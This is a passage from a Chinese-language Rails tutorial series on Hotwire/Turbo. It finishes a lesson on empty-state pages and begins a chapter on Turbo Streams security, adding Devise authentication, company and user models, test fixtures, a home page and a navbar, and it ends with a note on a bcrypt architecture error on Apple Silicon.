  <span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"empty-state__text"</span></span><span class="token operator">></span>
    You don't have any quotes yet<span class="token operator">!</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Add quote"</span></span><span class="token punctuation">,</span>
              new_quote_path<span class="token punctuation">,</span>
              <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span><span class="token punctuation">,</span>
              <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token string-literal"><span class="token string">%>
&lt;/div></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们就可以删除<code>destroy.turbo_stream.erb</code>中的修改内容了，我们不再需要任何自定义行为</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">&lt;%# app/views/quotes/destroy.turbo_stream.erb %>

&lt;%= turbo_stream.remove @quote %>
&lt;%= render_turbo_stream_flash_messages %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在再在浏览器中试试吧</p>
<ul>
<li>当我们列表中拥有数据时，空状态页消失</li>
<li>当没有数据时，空状态页展示</li>
</ul>
<p>这一部分我们只是用了CSS就完成了任务</p>
<h2 id="Wrap-up"><a href="#Wrap-up" class="headerlink" title="Wrap up"></a>Wrap up</h2><p>本章中，我们使用两种方式去控制空状态页</p>
<p>第一种方式，使用Turbo Frames 和 Turbo Stream去提前添加/删除空状态页在<code>Quotes#index</code>页面，虽然这个方案适合于大多数情况，但在HTML被广播到页面中的情况并不适和</p>
<p>第二种方式，我们使用了``:only-child<code> CSS pseudo-class</code>的魔力来完成所有的工作，而不需要写自定义的相关代码。</p>
<p>下面的章节，我们将在<code>Quotes#show</code>页面中完善我们的quote编辑器，再见</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第六章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E5%85%AD%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<p>Turbo Streams and security</p>
<p>本章我们将学习如何安全的使用Turbo Stream 和 避免广播数据到非法的用户。</p>
<h2 id="Understanding-Turbo-Streams-and-security"><a href="#Understanding-Turbo-Streams-and-security" class="headerlink" title="Understanding Turbo Streams and security"></a>Understanding Turbo Streams and security</h2><p>在将Turbo Streams放在线上环境前，我们必须知道如何保证安全，如果把含有私密数据的HTML发送到了不该接收的人那里，这会是一个很大的问题。</p>
<p>让我们想象一下我们的quote编辑器被一个公司使用，公司内有很多的员工，如果有天我们的数据被一个不属于该公司的人获取到了，那这就是个很大安全事故了。</p>
<p>我们将使用<a href="https://github.com/heartcombo/devise">Devise gem</a>对用户操作，模拟现实生活来对Turbo Stream security进行学习，并且我们将展示如果我们不够足够重视，将会出现哪些安全问题。</p>
<h2 id="What-we-will-build"><a href="#What-we-will-build" class="headerlink" title="What we will build"></a>What we will build</h2><p>我们将画一个草图来说明本章结束时系统的样子，我们将对没有登录的用户展示登录页面链接</p>
<p><img src="../../../../public/img/image-20230608124202557.png" alt="image-20230608124202557"></p>
<p>然后用户通过输入用户名，密码进行登录</p>
<p><img src="../../../../public/img/image-20230608124238125.png" alt="image-20230608124238125"></p>
<p>我们的用户在登录后跳转到首页，在导航栏中我们将根据电子邮件地址显示公司名称和用户名称，当点击<code>View quotes</code>按钮时，他们便可以操作我们的编辑器</p>
<p><img src="../../../../public/img/image-20230608124509545.png" alt="image-20230608124509545"></p>
<p>当点击<code>View quotes</code>按钮时，用户将被导航到<code>Quotes#index</code>页面，并带有一个导航栏</p>
<p><img src="../../../../public/img/image-20230608124718582.png" alt="image-20230608124718582"></p>
<p>然后我们添加好数据后，我们的系统看起来就可以了，不过我们会在浏览器中找到一个安全问题去做实验。</p>
<p><code>Quote,Company,User</code>的关系如下</p>
<ul>
<li>一个用户属于一个公司</li>
<li>一个quote属于一个公司</li>
<li>一个公司有多个用户</li>
<li>一个公司有多个quote</li>
</ul>
<p>我们的数据库设计会像下面的草图：</p>
<p><img src="../../../../public/img/image-20230608125106104.png" alt="image-20230608125106104"></p>
<p>我们会使用<code>rails db:seed</code>指令去添加数据，来模拟一个真是的场景，在<code>fixtures</code>中，我们需要两个公司和三个用户</p>
<ul>
<li><strong>KPMG</strong>公司有两个用户：an <strong>accountant</strong> and a <strong>manager</strong></li>
<li><strong>PwC</strong>公司只有一个用户：一个绝对不该知道<strong>KPMG公司</strong>数据的偷听者。</li>
</ul>
<p>让我们创建模型，并加入相关的依赖</p>
<h2 id="Adding-companies-to-our-Rails-application"><a href="#Adding-companies-to-our-Rails-application" class="headerlink" title="Adding companies to our Rails application"></a>Adding companies to our Rails application</h2><p>创建公司模型</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rails generate model Company name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>编辑迁移文件，需要保证公司名不能为空，添加：<code>null:false</code>进行数据库限制</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># db/migrate/XXXXXXXXXXXXXX_create_companies.rb</span>

<span class="token keyword">class</span> <span class="token class-name">CreateCompanies</span> <span class="token operator">&lt;</span> ActiveRecord<span class="token double-colon punctuation">::</span>Migration<span class="token punctuation">[</span><span class="token number">7.0</span><span class="token punctuation">]</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">change</span></span>
    create_table <span class="token symbol">:companies</span> <span class="token keyword">do</span> <span class="token operator">|</span>t<span class="token operator">|</span>
      t<span class="token punctuation">.</span>string <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span>

      t<span class="token punctuation">.</span>timestamps
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行迁移文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rails db:migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>操作模型，加入非空验证</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/company.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Company</span> <span class="token operator">&lt;</span> ApplicationRecord
  validates <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在fixture中的companies.yml中加入上面说的数据</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># test/fixtures/companies.yml</span>

<span class="token key atrule">kpmg</span><span class="token punctuation">:</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> KPMG

<span class="token key atrule">pwc</span><span class="token punctuation">:</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> PwC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们仅仅需要两个公司去让我们的实验跑通，所以就不用在<code>CompaniesController</code>中编完完整的增删改查代码和对应的试图，让我们来添加对应的用户吧。</p>
<h2 id="Adding-users-to-our-application-with-Devise"><a href="#Adding-users-to-our-application-with-Devise" class="headerlink" title="Adding users to our application with Devise"></a>Adding users to our application with Devise</h2><p>我们将使用<a href="https://github.com/heartcombo/devise">Devise gem</a>来添加用户，并进行权限校验</p>
<p>先添加<code>Gemfile</code></p>
<pre class="line-numbers language-none"><code class="language-none"># Gemfile

gem &quot;devise&quot;, &quot;~&gt; 4.8.1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>下载gem</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bundle <span class="token function">install</span>
bin/rails generate devise:install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用Devise生成器生成User模型</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails generate devise User
bin/rails db:migrate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>现在我们就有了User模型，我们需要页面去串联我们在介绍中描述的样子，但是这里我们不会写注册业务，这里只是为了学习安全相关内容，所以尽量让事情简单一些。</p>
<p>我们仅需要有用户，并能登录，所以我们将关闭Device的所有特性，除了下面两点：</p>
<ul>
<li>登录</li>
<li>校验</li>
</ul>
<p>下面的我们模型的样子</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/user.rb</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> ApplicationRecord
  devise <span class="token symbol">:database_authenticatable</span><span class="token punctuation">,</span> <span class="token symbol">:validatable</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后，在创建对应的fixtures文件</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># test/fixtures/users.yml</span>

<span class="token key atrule">accountant</span><span class="token punctuation">:</span>
  <span class="token key atrule">email</span><span class="token punctuation">:</span> accountant@kpmg.com
  <span class="token key atrule">encrypted_password</span><span class="token punctuation">:</span> &lt;%= Devise<span class="token punctuation">:</span><span class="token punctuation">:</span>Encryptor.digest(User<span class="token punctuation">,</span> 'password') %<span class="token punctuation">></span>

<span class="token key atrule">manager</span><span class="token punctuation">:</span>
  <span class="token key atrule">email</span><span class="token punctuation">:</span> manager@kpmg.com
  <span class="token key atrule">encrypted_password</span><span class="token punctuation">:</span> &lt;%= Devise<span class="token punctuation">:</span><span class="token punctuation">:</span>Encryptor.digest(User<span class="token punctuation">,</span> 'password') %<span class="token punctuation">></span>

<span class="token key atrule">eavesdropper</span><span class="token punctuation">:</span>
  <span class="token key atrule">email</span><span class="token punctuation">:</span> eavesdropper@pwc.com
  <span class="token key atrule">encrypted_password</span><span class="token punctuation">:</span> &lt;%= Devise<span class="token punctuation">:</span><span class="token punctuation">:</span>Encryptor.digest(User<span class="token punctuation">,</span> 'password') %<span class="token punctuation">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了安全，Devise存储加密的密码，如果我们希望存储加密后的<code>password</code>作为密码，我们需要对应的Devise gem去进行加密，这也是为什么我们使用<code>Devise::Encryptor.digest</code>。</p>
<p>现在模型都已经建立好了，接下来我们就对模型建立关联关系。</p>
<hr>
<h2 id="Users-companies-and-quotes-associations"><a href="#Users-companies-and-quotes-associations" class="headerlink" title="Users, companies and, quotes associations"></a>Users, companies and, quotes associations</h2><p>目前我们的模型间还没什么关系，我们现在创建对应的移植文件来添加对应的文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails generate migration add_company_reference_to_quotes company:references
bin/rails generate migration add_company_reference_to_users  company:references<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>第一个迁移文件，是对quotes添加<code>company_id</code>外键，第二个迁移文件，是对users添加<code>company_id</code>。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails db:migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<p><strong>注意：</strong>这里可能会执行失败，因为如果数据库已经有数据了，对应的<code>company_id</code>为空，这就与我们模型中设置的非空校验相冲突。</p>
<p>如果我们的项目已经到了线上，则只能先对所有的users和quotes指定<code>company_id</code>，然后在设置<code>null:false</code>约束，如果我们的项目不在线上，则我们可以简单的删掉数据库，然后从新创建并迁移。</p>
<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;rails db:drop db:create db:migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>现在我们迁移就可以完成了</p>
<hr>
<p>现在我们从模型中添加对应的关联关系</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/user.rb</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> ApplicationRecord
  devise <span class="token symbol">:database_authenticatable</span><span class="token punctuation">,</span> <span class="token symbol">:validatable</span>

  belongs_to <span class="token symbol">:company</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/company.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Company</span> <span class="token operator">&lt;</span> ApplicationRecord
  has_many <span class="token symbol">:users</span><span class="token punctuation">,</span> <span class="token symbol">dependent</span><span class="token operator">:</span> <span class="token symbol">:destroy</span>
  has_many <span class="token symbol">:quotes</span><span class="token punctuation">,</span> <span class="token symbol">dependent</span><span class="token operator">:</span> <span class="token symbol">:destroy</span>

  validates <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  belongs_to <span class="token symbol">:company</span>

  <span class="token comment"># All the previous code</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>相应的，我们修改我们的fixtures数据</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># test/fixtures/users.yml</span>

<span class="token key atrule">accountant</span><span class="token punctuation">:</span>
  <span class="token key atrule">company</span><span class="token punctuation">:</span> kpmg
  <span class="token key atrule">email</span><span class="token punctuation">:</span> accountant@kpmg.com
  <span class="token key atrule">encrypted_password</span><span class="token punctuation">:</span> &lt;%= Devise<span class="token punctuation">:</span><span class="token punctuation">:</span>Encryptor.digest(User<span class="token punctuation">,</span> 'password') %<span class="token punctuation">></span>

<span class="token key atrule">manager</span><span class="token punctuation">:</span>
  <span class="token key atrule">company</span><span class="token punctuation">:</span> kpmg
  <span class="token key atrule">email</span><span class="token punctuation">:</span> manager@kpmg.com
  <span class="token key atrule">encrypted_password</span><span class="token punctuation">:</span> &lt;%= Devise<span class="token punctuation">:</span><span class="token punctuation">:</span>Encryptor.digest(User<span class="token punctuation">,</span> 'password') %<span class="token punctuation">></span>

<span class="token key atrule">eavesdropper</span><span class="token punctuation">:</span>
  <span class="token key atrule">company</span><span class="token punctuation">:</span> pwc
  <span class="token key atrule">email</span><span class="token punctuation">:</span> eavesdropper@pwc.com
  <span class="token key atrule">encrypted_password</span><span class="token punctuation">:</span> &lt;%= Devise<span class="token punctuation">:</span><span class="token punctuation">:</span>Encryptor.digest(User<span class="token punctuation">,</span> 'password') %<span class="token punctuation">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># test/fixtures/quotes.yml</span>

<span class="token key atrule">first</span><span class="token punctuation">:</span>
  <span class="token key atrule">company</span><span class="token punctuation">:</span> kpmg
  <span class="token key atrule">name</span><span class="token punctuation">:</span> First quote

<span class="token key atrule">second</span><span class="token punctuation">:</span>
  <span class="token key atrule">company</span><span class="token punctuation">:</span> kpmg
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Second quote

<span class="token key atrule">third</span><span class="token punctuation">:</span>
  <span class="token key atrule">company</span><span class="token punctuation">:</span> kpmg
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Third quote<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行：<code>rails db:seed</code>来完成数据的加载</p>
<h2 id="Adding-a-home-page-to-our-application"><a href="#Adding-a-home-page-to-our-application" class="headerlink" title="Adding a home page to our application"></a>Adding a home page to our application</h2><p>现在我们已经有了用户，我们得让他们很容易地登陆，就像我们在本章节初画的草图描述一样</p>
<ol>
<li>用户必须登录后才能看到quote编辑器，并且他只能看到他所属公司的数据</li>
<li>如果用户没有登录，则必须引导用户到首页的登录表单那里</li>
</ol>
<p>为了解决上面的第一点，我们必须确保用户在系统的每个地方都被权限校验，让我们在<code>ApplicationController</code>中设置Devise的<code>authenticate_user!</code>方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/application_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">ApplicationController</span> <span class="token operator">&lt;</span> ActionController<span class="token double-colon punctuation">::</span>Base
  before_action <span class="token symbol">:authenticate_user!</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>解决上面的第二点，我们需要未通过权限校验的用户访问到登录表单中，否则他们无法登陆了。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/application_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">ApplicationController</span> <span class="token operator">&lt;</span> ActionController<span class="token double-colon punctuation">::</span>Base
  before_action <span class="token symbol">:authenticate_user!</span><span class="token punctuation">,</span> <span class="token symbol">unless</span><span class="token operator">:</span> <span class="token symbol">:devise_controller?</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们需要一个首页去引导用户登录，所以现在创建一个<code>PagesController</code>，其中home action 作为 root path，这个Controller是公共的，所以可以跳过权限校验。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/pages_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">PagesController</span> <span class="token operator">&lt;</span> ApplicationController
  skip_before_action <span class="token symbol">:authenticate_user!</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">home</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>添加对应的路由</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># config/routes.rb</span>

Rails<span class="token punctuation">.</span>application<span class="token punctuation">.</span>routes<span class="token punctuation">.</span>draw <span class="token keyword">do</span>
  <span class="token comment"># 这里需要加入这行代码，否则运行时会显示没有 devise的helper方法</span>
  devise_for <span class="token symbol">:users</span> 
  
  root to<span class="token operator">:</span> <span class="token string-literal"><span class="token string">"pages#home"</span></span>

  <span class="token comment"># All the other routes</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>添加对应的响应页面</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/pages/home.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span>h1<span class="token operator">></span>Quote editor<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token constant">A</span> blazing fast quote editor built with Hotwire<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> user_signed_in<span class="token operator">?</span> <span class="token string-literal"><span class="token string">%>
    &lt;%= link_to "View quotes", quotes_path, class: "btn btn--dark" %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">else</span> <span class="token string-literal"><span class="token string">%>
    &lt;%= link_to "Sign in", new_user_session_path, class: "btn btn--dark" %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们不会对这个登陆页面写过多的样式，而是花更多的时间在导航栏，让它在项目的每个页面都展示</p>
<p>让我们先添加导航栏的标签，现在我们会先使用占位符为公司名和当前用户名，但是很快我们就会修改掉，现在我们只需要专注于HTML</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/layouts/_navbar.html.erb %></span>

<span class="token operator">&lt;</span>header <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"navbar"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> user_signed_in<span class="token operator">?</span> <span class="token string-literal"><span class="token string">%>
    &lt;div class="navbar__brand"></span></span>
      Company name
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"navbar__name"</span></span><span class="token operator">></span>
      Current user name
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Sign out"</span></span><span class="token punctuation">,</span>
                  destroy_user_session_path<span class="token punctuation">,</span>
                  <span class="token symbol">method</span><span class="token operator">:</span> <span class="token symbol">:delete</span><span class="token punctuation">,</span>
                  <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--dark"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;% else %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Sign in"</span></span><span class="token punctuation">,</span>
                new_user_session_path<span class="token punctuation">,</span>
                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--dark navbar__right"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>header<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了让每页面都展示导航栏，所以我们可以直接在<code>application.html.erb</code>中渲染</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/layouts/application.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span>
<span class="token operator">&lt;</span>html<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the <span class="token operator">&lt;</span>head<span class="token operator">></span> content <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>

  <span class="token operator">&lt;</span>body<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"layouts/navbar"</span></span> <span class="token string-literal"><span class="token string">%>
    &lt;%= yield %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在每个页面都会展示了，我们来给导航栏写一下样式</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_navbar.scss

.navbar</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
  <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--shadow-large<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xxl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token selector">&amp;__brand</span> <span class="token punctuation">&#123;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-xl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-text-header<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__name</span> <span class="token punctuation">&#123;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
    <span class="token property">margin-left</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
    <span class="token property">margin-right</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-text-header<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__right</span> <span class="token punctuation">&#123;</span>
    <span class="token property">margin-left</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>记得要导入css到主文件中</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

// All the previous imports
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/navbar"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>好了，现在除了登录表单样式没设置好，其他内容都与我们的草图大致一样，我们来在浏览器中测试一下吧。（记得执行 ： <code>rails db:seed</code>来设置好必要的数据）</p>
<hr>
<p><strong>注意：</strong>在执行<code>rails db:seed</code>是，我的电脑(Mac mini2 arm64)爆出错误：<code>is an incompatible architecture (have &#39;x86_64&#39;, need &#39;arm64&#39;)</code>在执行bcrypt进行加密时。</p>
<ol>
<li>查看你的<code>Gemfile.lock</code>,看是否和下面一样</li>
</ol>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">PLATFORMS
  arm64<span class="token punctuation">-</span>darwin<span class="token punctuation">-</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="2">
<li>如果是，则在控制台执行: <code>uname -m</code>，查看是否为：<strong>x86_64</strong></li>
</ol>
<p>这说明，你在 Rosetta 模拟器中运行 Ruby 和 gem 时，它们会认为你的系统仍然是 ARM 架构，所以执行 <code>bundle install</code> 或 <code>gem install</code> 时会生成 <code>arm64-darwin-22</code> 的 <code>Gemfile.lock</code> 中的 <code>PLATFORMS</code>。</p>
<p>可以看到两者出现了偏差，当我们执行<code>bundle install</code>时，将使用当前终端窗口所处的编译架构来编译 gem，而这时候我们是通过Rosetta模拟器在x86_64架构上安装的gem，所以默认使用x86_64架构编译gem，并将这些gem安装到x86_64架构目录上。所以我们会在报错信息中看到空文件的提示。</p>
